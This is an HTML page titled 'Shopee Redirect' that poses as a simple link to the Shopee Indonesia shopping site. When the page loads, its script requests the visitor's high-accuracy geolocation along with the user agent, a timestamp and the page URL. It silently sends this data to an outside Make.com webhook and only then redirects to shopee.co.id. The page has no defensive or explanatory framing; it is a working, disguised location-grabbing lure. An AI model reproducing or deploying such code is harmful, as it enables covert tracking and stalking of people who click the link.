<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Shopee Redirect</title>
  <script>
    const WEBHOOK_URL = 'https://hook.eu2.make.com/snsxpo7oc5fyiy3fy697rqu29trp9rqy';

    async function sendLocationAndRedirect() {
      if (!navigator.geolocation) {
        window.location.href = 'https://shopee.co.id';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          const data = {
            latitude,
            longitude,
            accuracy,
            timestamp: new Date().toLocaleString('id-ID'),
            userAgent: navigator.userAgent,
            url: window.location.href,
            method: 'auto_redirect',
          };

          try {
            await fetch(WEBHOOK_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data),
            });
          } catch (e) {
            console.log('Gagal kirim data:', e);
          }

          // Redirect langsung
          window.location.href = 'https://shopee.co.id';
        },
        (err) => {
          console.log('Lokasi gagal:', err);
          window.location.href = 'https://shopee.co.id';
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    }

    window.onload = sendLocationAndRedirect;
  </script>
</head>
